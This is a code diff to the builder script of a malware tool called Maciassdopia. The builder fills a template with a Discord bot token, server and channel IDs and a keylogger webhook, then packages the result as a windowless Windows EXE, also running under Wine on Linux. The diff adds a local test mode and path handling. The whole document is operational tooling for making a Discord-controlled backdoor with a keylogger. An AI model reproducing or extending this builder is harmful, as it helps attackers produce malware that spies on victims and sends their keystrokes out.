@@ -1,5 +1,6 @@
 
 import os
+import distro
 import subprocess
 from sys import platform as OS
 from prettytable import PrettyTable
@@ -110,32 +111,34 @@ try:
         elif command_list[0] == "help":
             if len(command_list) == 1:
                 print_a("""
-                        Help Menu:
-                                
-                        "help <command>" Displays more help for a specific command
-                                
-                        "use <payload>" Selects a payload to use
-                                
-                        "set <setting> <value>" Sets a value to a valid setting
-                                
-                        "config" Shows the settings and their values
-                                
-                        "build" Packages the backdoor into an EXE file
-                                
-                        "update" Gets the latest version of Maciassdopia
-                                
-                        "exit" Terminates the builder
+        Help Menu:
+                
+        "help <command>" Displays more help for a specific command
+                
+        "use <payload>" Selects a payload to use
+                
+        "set <setting> <value>" Sets a value to a valid setting
+                
+        "config" Shows the settings and their values
+                
+        "build" Packages the backdoor into an EXE file
+
+        "build dev" Running backdoor localy (in cli) for testing purposes
+                
+        "update" Gets the latest version of Maciassdopia
+                
+        "exit" Terminates the builder
                         """)
             else:
                 if command_list[1] == "use":
                     print_a("""
-                            Help Menu:
-                                            
-                            "use <payload>" Selects a payload to use
-                                            
-                            Payloads:
-                                
-                            "discord" - A Discord based C2
+        Help Menu:
+                        
+        "use <payload>" Selects a payload to use
+                        
+        Payloads:
+            
+        "discord" - A Discord based C2
                             """)
                 elif command_list[1] == "set":
                     if payload == "":
@@ -143,17 +146,17 @@ try:
                     else:
                         if payload == "discord":
                             print_a("""
-                                    "Help Menu:
-                                                            
-                                    "set <setting> <value>" Sets a value to a valid setting
+        "Help Menu:
+                                
+        "set <setting> <value>" Sets a value to a valid setting
 
-                                    Settings:
+        Settings:
 
-                                    "name" - the name of the backdoor
-                                    "guild-id" The ID of the Discord server
-                                    "bot-token" The token of the Discord bot
-                                    "channel-id" - The ID of the Discord channel
-                                    "webhook" = The webhook for the keylogger
+        "name" - the name of the backdoor
+        "guild-id" The ID of the Discord server
+        "bot-token" The token of the Discord bot
+        "channel-id" - The ID of the Discord channel
+        "webhook" = The webhook for the keylogger
                                     """)
                 elif command_list[1] == "build" or command_list[1] == "update" or command_list[1] == "exit" or command_list[1] == "config" or command_list[1] == "clear" or command_list[1] == "cls":
                     print_a("[!] There is nothing more to show!")
@@ -172,17 +175,42 @@ try:
                     f = open("code/discord/main.py", 'r')
                     file = f.read()
                     f.close()
-                    newfile = file.replace("{GUILD}", str(list[1]))
-                    newfile = newfile.replace("{TOKEN}", str(list[2]))
-                    newfile = newfile.replace("{CHANNEL}", str(list[3]))
-                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(list[4]))
+                    newfile = file.replace("{GUILD}", str(settings[1]))
+                    newfile = newfile.replace("{TOKEN}", str(settings[2]))
+                    newfile = newfile.replace("{CHANNEL}", str(settings[3]))
+                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings[4]))
 
                 f = open(settings[0] + ".py", 'w')
                 f.write(newfile)
                 f.close()
 
+                if command_list[1] == "dev":
+                    if OS == "win32":
+                        subprocess.call(["py", settings[0] + ".py"])
+                        exit()
+                    else:
+                        if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe'):
+                            path_to_python = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe')
+                        else:
+                            path_to_python = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/python.exe')
+                        
+                        if "Arch" in distro.name() or "Manjaro" in distro.name():
+                            path_to_python = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe')
+                        
+                        subprocess.call(["wine", path_to_python, settings[0] + ".py"])
+                        exit()
+
                 # Checking path for pyinstaller.exe
-                path_to_pyinstaller = ""
+                if OS == "win32":
+                    path_to_pyinstaller = 'pyinstaller'
+                else:
+                    if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
+                        path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
+                    else:
+                        path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
+                    
+                    if "Arch" in distro.name() or "Manjaro" in distro.name():
+                        path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
 
                 compile_command = [path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", settings[0] + ".py"]
                 
